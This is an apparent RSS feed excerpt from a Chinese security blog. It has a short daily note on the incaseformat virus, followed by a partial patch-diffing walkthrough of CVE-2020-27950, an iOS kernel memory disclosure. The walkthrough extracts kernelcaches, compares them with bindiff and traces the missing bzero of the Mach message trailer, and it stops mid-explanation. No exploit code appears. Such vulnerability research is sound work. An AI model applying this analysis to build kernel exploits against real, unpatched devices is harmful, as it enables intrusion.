&lt;p&gt;发现一个很有意思的项目，教大家怎么玩macOS驱动漏洞挖掘利用的，不过作者目前只写了一点，希望别鸽，挺期待的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://fuzzing.science/vulnerable-kext/about/index.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这两天刷屏了一个病毒《&lt;a href=&quot;https://mp.weixin.qq.com/s/J3qblkEvGk-JXFKoIXTVPQ&quot;&gt;紧急通知：incaseformat病毒可清空硬盘&lt;/a&gt;》，这个病毒属于十多年前的老病毒，多家杀软都支持查杀，大家任选一个即可，这个病毒没啥特别的水平&lt;/p&gt;

&lt;p&gt;关于病毒想给大家科普些概念：病毒本质上也是一个软件，背后也是代码&lt;/p&gt;

&lt;p&gt;举个安卓病毒例子，我手机上有一款短信软件，有权限发送，接收，删除，编辑等权限，常规来看这种行为是没有问题的，那如果这个软件可以接收服务器的指令去做对应的行为呢？&lt;/p&gt;

&lt;p&gt;比如服务器下发一个A指令，这个软件执行代码把短信打包发送回服务器，服务器下发B指令，这个软件就删除所有短信&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;所有的行为，都是安卓系统本身所允许的操作&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;高级的病毒，会使用漏洞技术，这些我们暂时不讨论&lt;/p&gt;

&lt;p&gt;熊猫正正发了一篇对此事的看法《&lt;a href=&quot;https://mp.weixin.qq.com/s/5b7dr_k0gQdWnXPDN9Gxcg&quot;&gt;对incaseformat蠕虫事件一些思考&lt;/a&gt;》&lt;/p&gt;

&lt;p&gt;我以前也是搞APT病毒分析的，我可以理解其中一些观点，现在大家都喜欢吹各种新概念，各种人工智能，机器学习，我也自己跟着学过一些，但毕竟体系庞大而我又很菜，没学会&lt;/p&gt;

&lt;p&gt;又到了每周的吃瓜时间，pdd最近很火啊，火出圈了都&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6A75CE1D9F7688B7BBA4886B69293F04.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;远程删照片事件喜提热搜，这事我从技术角度讲几种可行方案&lt;/p&gt;

&lt;p&gt;合理合法不犯罪的第一种：该用户用的是Vivo手机，Vivo是定制的Android系统，Android系统应用使用的是权限申请机制，举个例子，比如某个应用它某个功能需要读写相册，那么它就会申请读写相册的权限，并且需要用户手动点击弹窗的确认按钮，保证用户是知道且同意这个应用申请了读写相册的权限，那么在手机这一侧，pdd已经拥有了读写相册的权限，客户端再跟服务端建立一个指令下发通道，然后就可以跟跟病毒一样下发指令做删除照片的操作了&lt;/p&gt;

&lt;p&gt;不合理不合法且犯罪的第二种：使用漏洞&lt;/p&gt;

&lt;p&gt;如果是搁平常，我第一反应就是第二种不可能，因为国内Android手机系统版本太多了，首先厂商不同，厂商手机型号不同，还有那些十八线乱七八糟的杂牌，漏洞利用又是比较精细的活，一个字节偏移错了手机都要崩&lt;/p&gt;

&lt;p&gt;但pdd现在这情况，我还真不敢说第二种没有可能，pdd的下沉用户到底有多下沉，有多少群体使用的手机系统根本就已经不维护更新了，其它不说，Sqlite，WebView，细思极恐&lt;/p&gt;

&lt;p&gt;大牛蛙发的朋友圈，看来脉脉上爆料的拒绝黑客攻击是真的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AB7A39D6FA52C93725EFF5FB19ABB05C.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;拼多多的安全大佬发的回忆录，我一直吐槽数字总是搬工位，看来垃圾行政管理哪哪都有，之前有一次搬工位，刚搬了一个月都不到，然后有一个其它部门的HR过来对着我们组的工位说她们要坐这里，我TM&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.leadroyal.cn/?p=1228#more-1228&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本来要收摊了，结果发现一封邮件，我现在是真的不敢去&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/5E3BA5D11F9FCF26E14A7451668952C8.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Fri, 15 Jan 2021 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2021/01/15/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.15.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2021/01/15/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2021.01.15.html</guid>
            </item>
        
            <item>
                <title>CVE-2020-27950 trailer->msgh_ad信息泄露</title>
                <description>&lt;p&gt;&lt;strong&gt;PDF版本请点击&lt;a href=&quot;/assets/pdf/CVE-2020-27950%20msgh_ad%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.pdf&quot;&gt;此处&lt;/a&gt;下载&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;公告&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Available for: macOS High Sierra 10.13.6, macOS Mojave 10.14.6

Impact: A malicious application may be able to disclose kernel memory. Apple is aware of reports that an exploit for this issue exists in the wild.

Description: A memory initialization issue was addressed.

CVE-2020-27950: Google Project Zero
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟着这篇文章复现CVE-2020-27950内核信息泄露漏洞&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.synacktiv.com/en/publications/ios-1-day-hunting-uncovering-and-exploiting-cve-2020-27950-kernel-memory-leak.html#&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第一次通过bindiff补丁对比逆向分析iOS内核漏洞，踩了不少坑，如果各位师傅有更好的分析办法可以多指点&lt;/p&gt;

&lt;p&gt;我们选用iPhone 6的两个固件版本：12.4.8和12.4.9&lt;/p&gt;

&lt;p&gt;漏洞版本iOS 12.4.8 (16G201) for iPhone 6&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://updates-http.cdn-apple.com/2020SummerFCS/fullrestores/001-11131/71ECCF56-5998-4F84-9386-F91387BC68A5/iPhone_4.7_12.4.8_16G201_Restore.ipsw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;补丁版本iOS 12.4.9 (16H5) for iPhone 6&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://updates-http.cdn-apple.com/2020FallFCS/fullrestores/001-73435/24D71947-C37D-4A9F-A958-340EDCA61AC4/iPhone_4.7_12.4.9_16H5_Restore.ipsw&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这两个固件都是ZIP压缩文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ~ file *.ipsw
iPhone_4.7_12.4.8_16G201_Restore.ipsw: Zip archive data, at least v2.0 to extract
iPhone_4.7_12.4.9_16H5_Restore.ipsw:   Zip archive data, at least v2.0 to extract
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解压缩出来，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kernelcache.release.iphone7&lt;/code&gt;就是压缩后的内核二进制文件&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  iPhone_4.7_12.4.8_16G201_Restore ls -al
total 6012560
drwxr-xr-x@  9 wnagzihxa1n  staff         288 Jan  2 19:41 .
drwxr-xr-x   7 wnagzihxa1n  staff         224 Jan  2 19:42 ..
-rw-r--r--@  1 wnagzihxa1n  staff  2874835794 Jan  9  2007 038-60223-004.dmg
-rw-r--r--@  1 wnagzihxa1n  staff    93846555 Jan  9  2007 038-60285-004.dmg
-rw-r--r--@  1 wnagzihxa1n  staff    91602971 Jan  9  2007 038-60305-004.dmg
-rw-r--r--@  1 wnagzihxa1n  staff      128367 Jan  9  2007 BuildManifest.plist
drwxr-xr-x@ 10 wnagzihxa1n  staff         320 Jan  9  2007 Firmware
-rw-r--r--@  1 wnagzihxa1n  staff         985 Jan  9  2007 Restore.plist
-rw-r--r--@  1 wnagzihxa1n  staff    14061377 Jan  9  2007 kernelcache.release.iphone7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;iPhone 6使用的是LZSS压缩算法&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  iPhone_4.7_12.4.8_16G201_Restore xxd -a kernelcache.release.iphone7 | head -n 10
00000000: 3083 d68f 3c16 0449 4d34 5016 046b 726e  0...&amp;lt;..IM4P..krn
00000010: 6c16 1e4b 6572 6e65 6c43 6163 6865 4275  l..KernelCacheBu
00000020: 696c 6465 722d 3134 3639 2e32 3630 2e31  ilder-1469.260.1
00000030: 3504 83d6 8f0b 636f 6d70 6c7a 7373 025a  5.....complzss.Z
00000040: b99c 01ae f208 00d5 cd8b 0000 0001 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
*
000001b0: 0000 0000 0000 ffcf faed fe0c 0000 01d5  ................
000001c0: 00f6 f002 f6f0 16f6 f058 115a f3f1 20f6  .........X.Z.. .
000001d0: f100 19f6 f028 faf0 3f5f 5f54 4558 5409  .....(..?__TEXT.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们对其进行解压缩，使用的工具是lzssdec&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://nah6.com/~itsme/cvs-xdadevtools/iphone/tools/lzssdec.cpp&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下载编译&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  lzssdec wget http://nah6.com/\~itsme/cvs-xdadevtools/iphone/tools/lzssdec.cpp
➜  lzssdec g++ lzssdec.cpp -o lzssdec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;解压缩kernelcache文件，现在我们获得了一个存在漏洞的固件版本，同理获取打补丁后的固件版本&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  iPhone_4.7_12.4.8_16G201_Restore ./lzssdec -o 0x1b6 &amp;lt; kernelcache.release.iphone7 &amp;gt; kernelcache.release.iphone7.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在漏洞版本和补丁版本的kernelcache文件都准备好了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  iPhone_4.7_12.4.8_16G201_Restore file kernelcache.release.iphone7.bin 
kernelcache.release.iphone7.bin: Mach-O 64-bit executable arm64
➜  iPhone_4.7_12.4.9_16H5_Restore file kernelcache.release.iphone7.bin                                              
kernelcache.release.iphone7.bin: Mach-O 64-bit executable arm64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过bindiff进行补丁对比，bindiff现在已经更新到了6&lt;/p&gt;

&lt;p&gt;因为一些大家都懂得的原因，Windows的IDA目前有最新的7.5，而macOS只有7.0，如果是IDA 7.0，目前只能使用bindiff 5，如果是7.5，开心的使用bindiff 6吧&lt;/p&gt;

&lt;p&gt;macOS版本有一个错误需要提前解决掉&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜  ~ sudo ln -s /Applications/BinDiff/BinDiff.app/Contents/MacOS/bin/bindiff /Applications/BinDiff/BinDiff.app/Contents/app/bindiff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为了使用更多的特性以及更准确的分析结果，我决定使用IDA 7.5&lt;/p&gt;

&lt;p&gt;将两个文件载入IDA 7.5进行分析，生成idb文件，再通过bindiff分析这两个idb文件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131014213093.png&quot; alt=&quot;image-20210131014213093&quot; /&gt;&lt;/p&gt;

&lt;p&gt;关于符号恢复这部分的一波三折大家可以看这篇文章《&lt;a href=&quot;https://mp.weixin.qq.com/s/4uJMMkCrIR9kk45TGBZxAQ&quot;&gt;关于恢复kernelcache符号的问题&lt;/a&gt;)》，记录了我这几天是如何踩坑的&lt;/p&gt;

&lt;p&gt;首先比对&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.8&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.9&lt;/code&gt;，得到八个差异函数，再逐个反编译查看代码，发现有五个函数是添加了同一段代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-assembly&quot;&gt;__TEXT_EXEC:__text:FFFFFFF00768E4C4 MOV             W1, #0x44 ; 'D'
__TEXT_EXEC:__text:FFFFFFF00768E4C8 MOV             X0, X20
__TEXT_EXEC:__text:FFFFFFF00768E4CC BL              sub_FFFFFFF00766D6C0
__TEXT_EXEC:__text:FFFFFFF00768E4D0 MOV             W23, #0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;现在记录者五个跟漏洞有关的函数，再用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_12.4.8&lt;/code&gt;和一个泄露符号的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kc_symbols&lt;/code&gt;，分别搜索前面记录的五个函数，通过bindiff的方式恢复出了两个正确的符号&lt;/p&gt;

&lt;p&gt;剩下三个函数其中一个具有字符串，搜索源码发现是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kobject_server()&lt;/code&gt;，此时剩下两个函数找不到符号&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;kc_12.4.8_func_name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;kc_12.4.9_func_name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Similarity&lt;/th&gt;
      &lt;th&gt;bindiff_symbol&lt;/th&gt;
      &lt;th&gt;true_symbol&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E3AC&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E3BC&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.58&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get_from_kernel&lt;/td&gt;
      &lt;td&gt;ipc_kmsg_get_from_kernel&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF00768E164&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.96&lt;/td&gt;
      &lt;td&gt;_ipc_kmsg_get&lt;/td&gt;
      &lt;td&gt;ipc_kmsg_get&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076A7824&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076A7840&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.13&lt;/td&gt;
      &lt;td&gt;_mach_gss_accept_sec_context_v2&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BE438&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BE470&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.11&lt;/td&gt;
      &lt;td&gt;_ipc_port_send_turnstile_prepare&lt;/td&gt;
      &lt;td&gt;ipc_kobject_server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BF8C8&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;sub_FFFFFFF0076BF90C&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;0.28&lt;/td&gt;
      &lt;td&gt;_ptmx_get_ioctl&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;同时搜索补丁代码中的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_FFFFFFF00766D6C0&lt;/code&gt;，确定是函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bzero()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131014237235.png&quot; alt=&quot;image-20210131014237235&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到这一步为止，我们勉强和作者拥有了同样的漏洞分析起点&lt;/p&gt;

&lt;p&gt;我们开始分析XNU源码，先从三个有符号的函数任选一个进行分析，我选择了函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_get()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;前两天刚好开源了最新的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xnu-7195.50.7.100.1&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://opensource.apple.com/tarballs/xnu/xnu-7195.50.7.100.1.tar.gz&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;再来一个早一点的版本&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xnu-6153.141.1&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://opensource.apple.com/tarballs/xnu/xnu-6153.141.1.tar.gz&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;源码一对比，果然多了函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bzero()&lt;/code&gt;的调用&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bzero(trailer, sizeof(*trailer));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;左边是漏洞版本，右边是补丁版本&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/Users/wnagzihxa1n/Library/Application Support/typora-user-images/image-20210131014305211.png&quot; alt=&quot;image-20210131014305211&quot; /&gt;&lt;/p&gt;

&lt;p&gt;补丁操作的变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trailer&lt;/code&gt;类型是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_max_trailer_t&lt;/code&gt;，而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_max_trailer_t&lt;/code&gt;是由&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_mac_trailer_t&lt;/code&gt;定义而来&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef mach_msg_mac_trailer_t mach_msg_max_trailer_t;
mach_msg_max_trailer_t          *trailer;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_mac_trailer_t&lt;/code&gt;是一个结构体，在这个结构体定义附近发现了两个宏：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_MSG_TRAILER_MINIMUM_SIZE&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MAX_TRAILER_SIZE&lt;/code&gt;，分别代表最大的trailer和最小的trailer长度，由此我们可以找到结构体&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_trailer_t&lt;/code&gt;的定义&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define MACH_MSG_TRAILER_MINIMUM_SIZE  sizeof(mach_msg_trailer_t)
#define MAX_TRAILER_SIZE ((mach_msg_size_t)sizeof(mach_msg_max_trailer_t))
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_type_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_size_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_seqno_t&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;msgh_seqno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;security_token_t&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;audit_token_t&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;msgh_audit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_context_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;msgh_context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_filter_id&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;msgh_ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;msg_labels_t&lt;/span&gt;                  &lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_mac_trailer_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_type_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_size_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_trailer_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从结构体定义可以看到，最大的trailer拥有好几个字段，长度为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x44&lt;/code&gt;，而最小的trailer结构体只有两个字段，长度为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;我喜欢结合函数功能来讲一个漏洞，比如它是什么作用，在哪里调用到，用户态可控的数据有哪些&lt;/p&gt;

&lt;p&gt;比如这个漏洞的补丁，什么是trailer？什么操作能调用到这段代码？&lt;/p&gt;

&lt;p&gt;作为入门选手，想要从我说的角度去理解这个漏洞，就需要先来学习下基础知识&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Mach Message&lt;/li&gt;
  &lt;li&gt;Mach Port&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Mach是XNU内核的内核，它实现了操作系统最基本的功能：进程和线程抽象，虚拟内存管理，任务调度，进程间通信和消息传递机制&lt;/p&gt;

&lt;p&gt;BSD实现于Mach之上，包括：网络协议栈，文件系统访问，设备访问等等&lt;/p&gt;

&lt;p&gt;以上来自《深入解析Mac OS X &amp;amp; iOS操作系统》第二章&lt;/p&gt;

&lt;p&gt;在Mach中有一个很基本的概念叫作Message，也就是消息，消息在两个Port之间传递，消息分为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Simple Message&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Complex Message&lt;/code&gt;，作为复杂消息，自然包含的字段数据要比简单消息要多&lt;/p&gt;

&lt;p&gt;Port简单可以理解为一个内核的消息队列，Task创建一个Port后，只有该Task对这个Port有接收消息的Right，其它Task都可以在获取发送Right后对该Port发送消息&lt;/p&gt;

&lt;p&gt;Mach Message的接收与发送依赖函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;进行，这个函数在用户态与内核态均有实现&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;send_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;rcv_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_msg_timeout_t&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;mach_port_name_t&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一条基本的消息由&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Message Header&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Message Body&lt;/code&gt;构成，它可以选择带上消息尾，也就是上面提到的trailer&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_header_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
